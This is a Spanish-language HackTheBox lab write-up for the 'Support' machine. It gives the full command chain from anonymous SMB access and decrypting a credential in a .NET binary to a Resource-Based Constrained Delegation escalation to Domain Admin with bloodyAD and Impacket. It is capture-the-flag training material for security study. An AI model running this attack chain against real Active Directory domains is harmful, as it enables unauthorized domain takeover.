# HTB - Support

Support es una Easy de Active Directory que, pese a su dificultad, toca conceptos muy reales y reutilizables: enumeracion SMB anonima, reversing de un binario .NET para recuperar una credencial ofuscada, enumeracion de LDAP por atributos, y una escalada a Domain Admin mediante Resource-Based Constrained Delegation (RBCD) aprovechando un GenericAll sobre el controlador de dominio.
## 1. Reconocimiento

Escaneo de puertos:

```
nmap -p- --min-rate 5000 -n -Pn 10.129.175.74 -oG allPorts
nmap -p53,88,389,445,636,5985 -sCV 10.129.175.74 -oN targeted
```

Los puertos dibujan un Domain Controller de manual: DNS (53), Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985) y ADWS (9389). No hay servicio web, asi que la entrada va por SMB o LDAP.

El nombre del host es DC y el dominio support.htb, de modo que el FQDN es dc.support.htb. Se anade al hosts:

```
10.129.175.74   support.htb dc.support.htb
```

---

## 2. Enumeracion SMB anonima

El primer check contra cualquier SMB es la sesion anonima (guest y null session). Aqui funciona:

```
nxc smb 10.129.175.74 -u 'guest' -p '' --shares
```

La salida confirma Null Auth: True y lista un recurso que no es estandar: support-tools (READ), con el comentario "support staff tools". El resto son recursos del sistema.

Contenido del recurso:

```
smbclient //10.129.175.74/support-tools -N
smb: \> dir
```

Entre herramientas legitimas (7-Zip, Notepad++, PuTTY, Sysinternals, Wireshark) destaca UserInfo.exe.zip: nombre propio, no es software conocido y con fecha distinta al resto. Se descarga:

```
smb: \> get UserInfo.exe.zip
```

---

## 3. Reversing del binario .NET

Al descomprimir aparece UserInfo.exe junto a sus DLL. El file lo identifica como ensamblado .NET (Mono/.Net assembly), lo que permite decompilarlo a C# casi legible.

En Exegol no venia ilspycmd, se instala como herramienta global de .NET fijando una version compatible con el SDK 6:

```
dotnet tool install -g ilspycmd --version 8.0.0.7246
export PATH="$PATH:/root/.dotnet/tools"
ilspycmd UserInfo/UserInfo.exe > UserInfo_decompiled.cs
```

En el codigo decompilado aparece la clase que gestiona la contraseña y la conexion LDAP:

```
private static string enc_password = "REDACTED_BASE64_BLOB";
private static byte[] key = Encoding.ASCII.GetBytes("REDACTED_KEY");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    byte[] array2 = array;
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```

Y la clase LdapQuery confirma para quien es esa contraseña:

```
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

La ofuscacion es: decodificar base64, aplicar XOR byte a byte con una clave fija embebida en el binario (reciclada con modulo) y otro XOR con 0xDF. Como el XOR es simetrico, se revierte replicando el mismo bucle con los valores reales que veas en tu decompilado:

```python
import base64

enc_password = "REDACTED_BASE64_BLOB"
key = b"REDACTED_KEY"

data = base64.b64decode(enc_password)
out = bytearray()
for i in range(len(data)):
    out.append(data[i] ^ key[i % len(key)] ^ 0xDF)

print(out.decode())
```

Resultado, la contraseña de la cuenta de servicio ldap (redactada):

```
REDACTED
```

---

## 4. De ldap a support (atributo info)

Se validan las credenciales. Son correctas en SMB, pero ldap no tiene WinRM:

```
nxc smb 10.129.175.74 -u 'ldap' -p 'REDACTED'
nxc winrm 10.129.175.74 -u 'ldap' -p 'REDACTED'
```

Ya como usuario autenticado del dominio, se enumeran usuarios. La columna Description de nxc solo muestra el atributo description (vacio en todos). Pero en Active Directory existen mas atributos; uno tipico para esconder notas es info. Se consulta LDAP directamente sobre el usuario support, pidiendo todos sus atributos:

```
ldapsearch -x -H ldap://10.129.175.74 \
  -D 'ldap@support.htb' -w 'REDACTED' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)'
```

En la salida aparece la joya:

```
info: REDACTED
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Dos cosas clave: la contraseña de support esta en texto plano en info, y support es miembro de Remote Management Users (puede entrar por WinRM) y de Shared Support Accounts (relevante para la escalada).

---

## 5. Foothold: WinRM y user.txt

```
nxc winrm 10.129.175.74 -u 'support' -p 'REDACTED'
evil-winrm -i 10.129.175.74 -u 'support' -p 'REDACTED'
```

Dentro (es PowerShell, no Linux: whoami, no id):

```
type C:\Users\support\Desktop\user.txt
```

---

## 6. Escalada: RBCD via GenericAll sobre el DC

El usuario support, por el grupo Shared Support Accounts, tiene control total sobre el objeto del controlador de dominio. Se confirma con bloodyAD, sin necesidad de la interfaz de BloodHound:

```
bloodyAD -u support -p 'REDACTED' -d support.htb --host 10.129.175.74 get writable
```

La entrada relevante:

```
distinguishedName: CN=DC,OU=Domain Controllers,DC=support,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

Esa combinacion (WRITE, WriteOwner, WriteDacl) es lo que BloodHound representa como GenericAll sobre DC.SUPPORT.HTB. Con escritura sobre el objeto del DC se puede montar un Resource-Based Constrained Delegation.

La idea del RBCD: se crea un equipo controlado por el atacante, se configura el DC para que confie en ese equipo para delegar (atributo msDS-AllowedToActOnBehalfOfOtherIdentity), y mediante Kerberos S4U se pide un ticket de servicio haciendose pasar por Administrator.

Paso 1, comprobar que se pueden crear equipos. El atributo ms-DS-MachineAccountQuota define cuantas cuentas de equipo puede crear un usuario:

```
bloodyAD -u support -p 'REDACTED' -d support.htb --host 10.129.175.74 get object 'DC=support,DC=htb' --attr ms-DS-MachineAccountQuota
```

Devuelve 10, asi que hay via libre.

Paso 2, crear el equipo falso:

```
bloodyAD -u support -p 'REDACTED' -d support.htb --host 10.129.175.74 add computer FAKE01 'FakePass123!'
```

Paso 3, configurar el RBCD en el DC para que confie en FAKE01:

```
bloodyAD -u support -p 'REDACTED' -d support.htb --host 10.129.175.74 add rbcd 'DC$' 'FAKE01$'
```

Verificacion de que el atributo quedo escrito con el SID de FAKE01:

```
bloodyAD -u support -p 'REDACTED' -d support.htb --host 10.129.175.74 get object 'DC$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
```

Paso 4, pedir el ticket de servicio impersonando a Administrator (S4U2self + S4U2proxy). Kerberos trabaja con nombres, por lo que el DC debe resolver por su FQDN y el reloj debe estar en hora con el DC (aqui ya coincidia, se comprueba con rdate -np 10.129.175.74):

```
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator -dc-ip 10.129.175.74 'support.htb/FAKE01$:FakePass123!'
```

Se guarda el ticket en formato ccache y se carga en la variable de entorno que usan las herramientas de Impacket:

```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Paso 5, usar el ticket para obtener shell como Administrator. Importante apuntar al nombre dc.support.htb (no a la IP), porque el ticket es para el SPN cifs/dc.support.htb:

```
wmiexec.py -k -no-pass dc.support.htb
```

Sesion como support\administrator. Flag de root:

```
type C:\Users\Administrator\Desktop\root.txt
```

PWNED

